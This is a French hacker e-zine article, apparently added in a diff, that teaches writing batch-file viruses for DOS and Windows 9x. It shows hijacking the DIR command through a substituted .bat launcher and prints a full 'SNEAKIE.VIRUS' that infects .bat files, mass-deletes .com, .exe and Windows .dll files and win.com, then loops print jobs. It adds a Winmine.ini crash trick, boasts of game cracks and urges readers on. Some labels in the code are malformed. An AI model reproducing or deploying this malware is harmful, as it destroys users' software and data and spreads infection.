@@ -1,0 +1,175 @@
+-------[  RtC Mag, At the end of the universe  ]
+
+--------------[  Virus Batch  ]
+---------[ in RtC mag 1 ]
+----[  by SnEaKie <sneakie-rtc@fr.st>  ]
+
+
+-------[  Intro sur ce qu'est concretement le Batch et ses possibilites.
+
+
+    Certes, moins complexe et plus lente que la programmation assembleur, ce type de programmation semble démodé et pourtant, elle est toujours utile que ce soit pour les utilisateurs de Win98,Win95 ou même Win3.11 ou les "encore plus anciens" qui tournent sous MsDos 6.2 ou inférieur. Cette programmation permet de créer des raccourcis grâce à des variables qui peuvent être insérées comme texte à taper.
+
+Selon vous, ces conditions sont-elles réalisables avec la programmation BATCH :
+    1) Un virus résident (Pas dans le sens ou l'on l'entend habituellement.)
+    2) Un virus qui s'active sur une faute de frappe.
+    3) Un virus qui infecte le démarrage de l'ordinateur.
+Et bien OUI, ces conditions sont tout à fait réalisables grâce à la programmation Batch.
+
+Commençons par le commencement ; il existe différents cas de figure :
+
+ - Soit vous possédez une machine qui tourne sous MsDos, auquel cas vous n'avez d'autres moyens pour rendre votre virus résident que de le lancer au démarrage de l'ordinateur en spécifiant son adresse complète dans le fichier de démarrage le plus virolé (car très facile à faire) l'Autoexec.bat qui va de paire avec son confrère Config.sys qui sert à charger des gestionnaires (pas toujours très sûr grâce à l'assembleur :-)
+
+ - Soit vous possédez une machine qui tourne sous Win98, 95 ou Win3.11, dans ce cas, il vous suffit de procéder exactement comme avec MsDos ainsi que les commandes de ce dernier.
+
+ - Soit avec Win98 et 95, le plus facile. Saviez-vous que sous Win98/95 existe un répertoire appelé COMMAND, dans ce dernier gisent les commandes MsDos utilisables sous Windows. Saviez-vous aussi que ces dernières sont "montées" ou "chargées" au démarrage de Windaube pardon , Windows donc si modification de ces commandes: virus chargé  :))
+    Prenons l'exemple de cette bonne vieille commande DIR.exe si vous créez une nouvelle commande DIR.bat qui appelle l'ancienne commande DIR.exe qui a été déplacée au préalable, comme suit :
+
+move c:\windows\command\dir.exe c:\windows\system\dir.exe
+ ===> Ceci déplace votre DIR.exe dans le nouveau dossier que vous avez spécifié ici, c:\windows\system.
+
+    Ensuite, vous faites un autre Bat qui lance votre virus avant ou après le lancement de DIR.exe.
+
+%lancement de votre virus%
+call c:\windows\system\dir.exe    ==> La commande call permet de lancer le fichier sans fermer 
+%ou lancement de votre virus%     ==> le Bat en cours d'éxécution.
+
+    Ces opérations vous assure qu'une fois que l'utilisateur se servira de ce fichier, il lancera votre virus avant ou après redémarrage de sa machine. Encore faut-il que celui-ci ne se rende pas compte que son fichier à changé d'extension.
+
+    Ce petit intermède étant fait dans le but d'initier quelques-uns des lecteurs de ce zine. Maintenant passons aux choses plus sérieuses, je pourrais faire un cours sur les variables si certains d'entre vous m'envoie des réclamations, mais passons plutôt à la programmation de virus "violents" et suffisamment évolués pour faire planter grave des milliers de machines.
+
+
+-------[  Petit virus simple de ma composition !
+
+
+--- SNEAKIE.VIRUS -------------------------------------------------------------
+
+@echo off               ; cette commande désactive l'affichage de certains compte-rendus
+
+cls                     ; comme toujours, cela efface l'écran.  
+
+
+:debut                  ; étiquette qui sert à faire des renvois. 
+if exist 1.txt goto 1   ; Petite bombe à retardement, 1,2,3 fois rien et puis après ...
+if exist 2.txt goto 2
+if exist 3.txt goto 3
+if exist 4.txt goto 4
+goto fin2
+
+:1
+del 1.txt
+goto debut
+
+:2
+del c:\2.txt
+goto debut
+
+:3
+del c:\3.txt
+goto debut
+
+:4
+del c:\4.txt
+goto debut
+
+:fin2
+echo Ce programme marche a merveille !
+
+:repro
+for %%a in (*.bat) do type %%a | find "sn" > text.vir                ; ces quelques lignes méritent explications plus    
+for %%a in (*.bat) do copy %%a %%a.kil                               ; bas !
+for %%a in (*.bat) do copy text.vir + %%a.kil %%a          
+
+:repro2
+for %%a in (*.com) do del %%a
+
+:repro3
+for %%a in (*.exe) do del %%a
+
+:windows
+if exist c:\windows\win.com goto window     ; 80% des personnes ont comme répertoire c:\windows
+if exist c:\win\win.com goto window         ; 15% ont c:\win et le reste c divers
+goto print                                  ; et donc, pour cerner le + de machines
+                                            ; il vaut mieux faire un test du répertoire windows
+                                            ; et l'utiliser en fonction du résultat.
+
+window:
+cd c:\windows
+
+wind:
+cd c:\win
+
+:dll
+for %%a in (*.dll) do del %%a
+del win.com             ; C'est win.com pas win.exe, erreur de ma part, désolé!
+
+:virus
+if exist c:\virus.txt goto impression
+
+:nonimpression
+echo WARNING A Virus Has Intruded Your System ! >c:\virus.txt
+c:\windows\command\print < c:\virus.txt
+
+:print                                 ; il y a une boucle a cet endroit pour que l'impression soit 
+print c:\virus.txt                     ; réalisée en boucle qui démarre ici et qui finit au renvoi   
+goto print                             ; 'goto print'.
+
+--- SNEAKIE.VIRUS -------------------------------------------------------------
+
+Attention celui-ci fait appel à d'autres fichiers qui sont des sous-fichiers.
+
+
+-------[  Explications
+
+
+Comme promis , les explications :
+
+    For %%a in (*.bat) do type %%a | find "sn" > text.vir
+
+ ==> Le For %%a in (*.bat) do ..... signifie que pour tous les fichiers *.bat du répertoire de travail, il fera telle ou telle chose spécifiée. 
+
+La suite :
+
+    do type %%a
+
+ ==> Cela veut dire qu'il ouvre à vitesse rapide les fichiers qu'il aura trouvés en *.bat et le :  
+
+    | find "sn" > text.vir
+
+ ==> déja, "|" veut dire qu'il fait les deux opérations séparées par cette barre à la fois et find "sn" signifie qu'il va se mettre à la recherche de ces caractères "sn" comme Snake! et > text.vir veut dire qu'il va mettre en mémoire les infos trouvées qui contiennent "sn" et qu'il va créer un fichier du nom de text.vir qui contiendra les lignes virolées car se seront celles qui seront trouvées.  
+
+    De même lorque vous voyez For %%a in (*.bat) do del %%a , veut dire que lorsque les fichiers qui possèdent l'extension spécifiée seront trouvés, alors ils seront supprimés : Del signifie supprimer.
+
+
+-------[  Petit rappel de quelques fonctions batch ambigues
+
+
+    Maintenant un petit rappel assez simple pour ceux qui veulent infecter des fichiers sans pour autant en changer le nom, il suffit de fusionner 2 fichiers (virus + programme de base) afin qu'il ne fasse plus qu'un (programme virolé). Pour cela, il existe 2 types d'opérations différentes qui conduisent au même résultat. 
+
+ * copy exemple.txt + exemple2.txt exemple.txp ==> lors de cette opération, le premier fichier spécifié qui s'appelle exemple.txt sera placé avant l'autre fichier du nom d'exemple2.txt et ces deux fichiers une fois fusionnés donneront naissance à un fichier intitulé exemple.txp.
+
+ * lorsqu'il s'agit de copier un virus qui possède une signature, par exemple.
+Type exemple.txt | find "Virus">> exemple.txp
+
+
+    Petit inconvénient de la commande print ! (solvable bien sûr :-)   
+
+    Avec la commande print réside un problème imminent ; en effet, il faut lancer la commande une première fois en spécifiant le port par défaut de l'imprimante d'ou l'idée de faire :
+
+c:\dos\print < c:\hackviru\prn.txt ==> la valeur par défaut est 'prn'. En faisant cette opération, la commande print va être lancée et prn va s'afficher ainsi la commande sera prête car il faudra la lancer une seconde fois en mettant alors le fichier à imprimer dans la file d'attente, ce qui sera fait lors de :
+print c:\virus.txt.
+
+    Petites remarques sur cet article, un second est prévu sur l'explication d'un virus Batch plus puissant, seulement certaines bribes de ce virus ne sont pas transposables à W98 et 95, en effet, la commande print n'existe ni sous le 95 ni sous le 98 dans le répertoire Windows\Command. De ce fait, toutes les lignes qui contiennent ces caractères sont vraies sous Dos ou W3.11 mais non transposables sous W95 et 98. Dommage, je cherche encore comment trouver un moyen universel de lancer une impression à partir des commandes Ms-Dos sous ces versions d'OS : W98 et 95. Cependant en ce qui concerne ce qui suit, quelque soit la version de votre OS, cela marche et bien!   
+
+
+-------[  Exploitation d'un petite faille du démineur !
+
+    Il existe bien d'autres façons de faire planter des ordinateurs, d'ailleurs la dernière fois que je suis allé chez mon très cher ami xxx (son anonymat est très important selon lui !), j'ai planté son Cyrix en faisant une manipulation très très simple. Allez, je vais vous dévoiler une faille du démineur, très pratique car celui-ci est présent sur toutes les machines qui possèdent Windows quelle que soit la version. Si votre machine est assez coopérative, vous verrez alors apparaître les bonnes vieilles erreurs fatales Windows : avec un peu plus de chance : "Mémoire dangereusement basse!". Winmine est le nom du démineur sous windows et ce jeu plutôt précaire possède un fichier *.ini qui initialise le programme Winmine.exe. Dans ce Winmine.ini il suffit d'étudier la grandeur de la grille de jeu, soit x1 le nombre de cases en longeur et x2 le nombre de cases en hauteur, reste alors à définir le nombre de mines, pour faire planter en beauté la machine il suffit d'établir un nombre de mines qui soit définit selon : 
+(x1*x2)+1 = Nombre de mines.
+    Donc il y a plus de mines que de cases ainsi l'ordinateur plante en beauté. Ceci est une petite faille que j'ai remarquée et qui m'a explosé et dont je voulais faire part à tous. Récemment un ami m'a apporté un jeu GTA (vraiment excellent). Le soir même mes amis et moi (xxx , xxx , xxx) avons entreprit de faire un crack qui est fini. Nous avons 
+déjà réalisé un crack pour Megarace2 et pour Worms1 et 2, et bien d'autres encore ... Qui sait, ces cracks seront-ils disponibles, si vous nous demandez de les faire apparaître sur notre site Internet.
+
+    PS : C'est bien beau mais au niveau de la programmation Batch, il existe très peu d'antivirus capables de détecter réellement des virus puissants. Et ouais, pourquoi il faut pas hésiter : bon courage ...!!! 
+
+
+-------[  EOF
